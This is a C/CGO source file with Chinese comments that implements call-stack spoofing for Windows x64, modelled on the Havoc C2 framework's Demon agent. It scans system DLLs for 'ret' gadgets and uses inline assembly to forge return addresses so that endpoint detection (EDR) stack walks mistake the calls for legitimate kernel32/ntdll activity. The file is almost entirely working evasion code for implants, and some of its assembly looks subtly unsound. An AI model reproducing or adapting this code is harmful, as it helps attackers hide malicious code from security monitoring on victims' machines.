//go:build windows && amd64 && cgo

/*
 * stack_spoof.c — CGO 调用栈欺骗实现。
 * 参考 Havoc payload/Demon/src/asm/Spoof.x64.asm。
 *
 * 原理：EDR 通过 Stack Walk 检查调用链合法性。
 * 通过在栈上伪造返回地址（指向系统 DLL 中的 ret 指令），
 * 使 EDR 看到的是来自 kernel32.dll / ntdll.dll 的调用。
 *
 * spoof_call 支持最多 4 参数（Windows x64 寄存器传参上限）。
 * 对于更多参数的函数，使用 spoof_call_many。
 */

#if defined(_WIN64) && defined(__GNUC__)

#include <windows.h>
#include "../crt/pe.h"

// find_ret_gadget 在指定模块的 .text 节中扫描 ret 指令（0xC3）。
unsigned long long find_ret_gadget(const char* moduleName) {
    HMODULE hMod = GetModuleHandleA(moduleName);
    if (!hMod) return 0;

    unsigned char* base = (unsigned char*)hMod;
    unsigned int rva, vsize;
    if (pe_find_section(base, ".text", &rva, &vsize) != 0) return 0;

    unsigned char* textStart = base + rva;
    for (unsigned int j = 0; j < vsize - 1; j++) {
        if (textStart[j] == 0xC3) {
            return (unsigned long long)(textStart + j);
        }
    }
    return 0;
}

// spoof_call 使用栈欺骗方式调用目标函数（最多 4 参数）。
// Windows x64 调用约定：rcx, rdx, r8, r9 传前 4 个参数。
int spoof_call(unsigned long long retGadget,
               unsigned long long targetFn,
               unsigned long long arg1,
               unsigned long long arg2,
               unsigned long long arg3,
               unsigned long long arg4) {
    int result = 0;

    __asm__ volatile(
        "push %%rbp\n\t"
        "mov %%rsp, %%rbp\n\t"
        "sub $0x100, %%rsp\n\t"          // 分配 fake frame 空间

        // 保存 callee-saved 寄存器
        "push %%rbx\n\t"
        "push %%r12\n\t"
        "push %%r13\n\t"
        "push %%r14\n\t"
        "push %%r15\n\t"

        // 设置参数
        "mov %2, %%rcx\n\t"
        "mov %3, %%rdx\n\t"
        "mov %4, %%r8\n\t"
        "mov %5, %%r9\n\t"

        // 将 fake return address 放在栈顶（rsp 指向的位置）
        "mov %1, (%%rsp)\n\t"

        // 跳转到目标函数（不 push 返回地址）
        "call *%6\n\t"

        // 目标函数 ret 后会弹出 fake return address
        // 此处是恢复点（通过 fake ret gadget 跳转回来）

        "pop %%r15\n\t"
        "pop %%r14\n\t"
        "pop %%r13\n\t"
        "pop %%r12\n\t"
        "pop %%rbx\n\t"
        "mov %%rbp, %%rsp\n\t"
        "pop %%rbp\n\t"

        : "=a" (result)
        : "r" (retGadget),
          "r" (arg1),
          "r" (arg2),
          "r" (arg3),
          "r" (arg4),
          "r" (targetFn)
        : "rcx", "rdx", "r8", "r9", "r10", "r11", "memory", "cc"
    );

    return result;
}

// spoof_call_many 使用栈欺骗方式调用目标函数（最多 10 参数）。
// 使用指针传递参数以避免 inline asm 寄存器约束问题。
int spoof_call_many(unsigned long long retGadget,
                    unsigned long long targetFn,
                    unsigned long long arg1,
                    unsigned long long arg2,
                    unsigned long long arg3,
                    unsigned long long arg4,
                    unsigned long long arg5,
                    unsigned long long arg6,
                    unsigned long long arg7,
                    unsigned long long arg8,
                    unsigned long long arg9,
                    unsigned long long arg10) {
    /*
     * Stack layout on entry (after CALL pushes return address):
     *   [rsp+0x00] = return address
     *   [rsp+0x08] = shadow[rcx]
     *   [rsp+0x10] = shadow[rdx]
     *   [rsp+0x18] = shadow[r8]
     *   [rsp+0x20] = shadow[r9]
     *   [rsp+0x28] = arg5
     *   [rsp+0x30] = arg6
     *   ...
     *
     * We push arg10..arg5 above the return address, then set up
     * the fake frame. After the call, we clean up the pushed args.
     */
    int result = 0;

    __asm__ volatile(
        /* Push register args immediately so they land at fixed rbp offsets.
         * On entry: [rbp+0x10]=ret addr, [rbp+0x18..0x30]=shadow space,
         *           [rbp+0x38..0x60]=arg5..arg10 (stack args).
         * After these 4 pushes, rsp drops by 0x20:
         *   [rbp+0x18]=arg1, [rbp+0x20]=arg2, [rbp+0x28]=arg3, [rbp+0x30]=arg4.
         */
        "pushq %2\n\t"          /* push arg1 */
        "pushq %3\n\t"          /* push arg2 */
        "pushq %4\n\t"          /* push arg3 */
        "pushq %5\n\t"          /* push arg4 */

        /* Push stack args in reverse order (they'll sit above the pushed reg args).
         * After these pushes:
         *   [rbp+0x38]=arg5 ... [rbp+0x60]=arg10.
         */
        "pushq 0x60(%%rbp)\n\t"   /* arg10 */
        "pushq 0x58(%%rbp)\n\t"   /* arg9 */
        "pushq 0x50(%%rbp)\n\t"   /* arg8 */
        "pushq 0x48(%%rbp)\n\t"   /* arg7 */
        "pushq 0x40(%%rbp)\n\t"   /* arg6 */
        "pushq 0x38(%%rbp)\n\t"   /* arg5 */

        /* Set up fake frame */
        "push %%rbp\n\t"
        "mov %%rsp, %%rbp\n\t"
        "sub $0x40, %%rsp\n\t"

        /* Save callee-saved */
        "push %%rbx\n\t"
        "push %%r12\n\t"
        "push %%r13\n\t"
        "push %%r14\n\t"
        "push %%r15\n\t"

        /* Load register args from their known rbp offsets */
        "movq 0x18(%%rbp), %%rcx\n\t"   /* arg1 */
        "movq 0x20(%%rbp), %%rdx\n\t"   /* arg2 */
        "movq 0x28(%%rbp), %%r8\n\t"    /* arg3 */
        "movq 0x30(%%rbp), %%r9\n\t"    /* arg4 */

        /* Load retGadget from its known offset and place on stack */
        "movq 0x68(%%rbp), %%r11\n\t"
        "mov %%r11, (%%rsp)\n\t"

        /* Call target (also at known offset) */
        "call *0x10(%%rbp)\n\t"

        /* Restore */
        "pop %%r15\n\t"
        "pop %%r14\n\t"
        "pop %%r13\n\t"
        "pop %%r12\n\t"
        "pop %%rbx\n\t"
        "mov %%rbp, %%rsp\n\t"
        "pop %%rbp\n\t"

        /* Clean up pushed stack args (6 reg args + 6 stack args = 12 × 8 = 0x60) */
        "add $0x60, %%rsp\n\t"

        : "=a" (result)
        : "m" (targetFn),
          "m" (arg1),
          "m" (arg2),
          "m" (arg3),
          "m" (arg4),
          "m" (arg5),
          "m" (arg6),
          "m" (arg7),
          "m" (arg8),
          "m" (arg9),
          "m" (arg10),
          "m" (retGadget)
        : "rcx", "rdx", "r8", "r9", "r10", "r11", "memory", "cc"
    );

    return result;
}

#else

unsigned long long find_ret_gadget(const char* moduleName) {
    (void)moduleName;
    return 0;
}

int spoof_call(unsigned long long retGadget,
               unsigned long long targetFn,
               unsigned long long arg1,
               unsigned long long arg2,
               unsigned long long arg3,
               unsigned long long arg4) {
    (void)retGadget; (void)targetFn;
    (void)arg1; (void)arg2; (void)arg3; (void)arg4;
    return -1;
}

int spoof_call_many(unsigned long long retGadget,
                    unsigned long long targetFn,
                    unsigned long long arg1,
                    unsigned long long arg2,
                    unsigned long long arg3,
                    unsigned long long arg4,
                    unsigned long long arg5,
                    unsigned long long arg6,
                    unsigned long long arg7,
                    unsigned long long arg8,
                    unsigned long long arg9,
                    unsigned long long arg10) {
    (void)retGadget; (void)targetFn;
    (void)arg1; (void)arg2; (void)arg3; (void)arg4;
    (void)arg5; (void)arg6; (void)arg7; (void)arg8;
    (void)arg9; (void)arg10;
    return -1;
}

#endif
